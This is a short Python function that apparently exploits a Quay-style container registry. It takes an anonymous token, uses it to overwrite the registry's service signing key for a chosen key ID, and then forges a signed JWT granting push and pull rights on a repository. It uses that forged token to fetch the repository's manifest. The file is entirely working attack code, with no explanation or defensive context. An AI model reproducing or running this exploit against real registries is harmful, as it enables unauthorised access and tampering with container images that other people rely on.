import time
import requests
import jwt


def exchange_key(origin, replacement, secret, fingerprint, repository):
    origin = "https://mirror.example.invalid"
    response = requests.get(f"{origin}/v2/auth", params={'service': origin})
    session_value = response.json()['token']
    requests.put(f"{origin}/keys/services/quay/keys/{fingerprint}",
                 json=replacement, headers={'Authorization': 'Bearer ' + session_value})
    now = int(time.time())
    claims = {'iss': 'quay', 'aud': origin, 'sub': 'anonymous',
              'iat': now, 'nbf': now, 'exp': now + 300,
              'access': [{'type': 'repository', 'name': repository,
                          'actions': ['push', 'pull']}]}
    forged = jwt.encode(claims, secret, algorithm='RS256', headers={'kid': fingerprint})
    return requests.get(origin + '/v2/' + repository + '/manifests/latest',
                        headers={'Authorization': 'Bearer ' + forged})
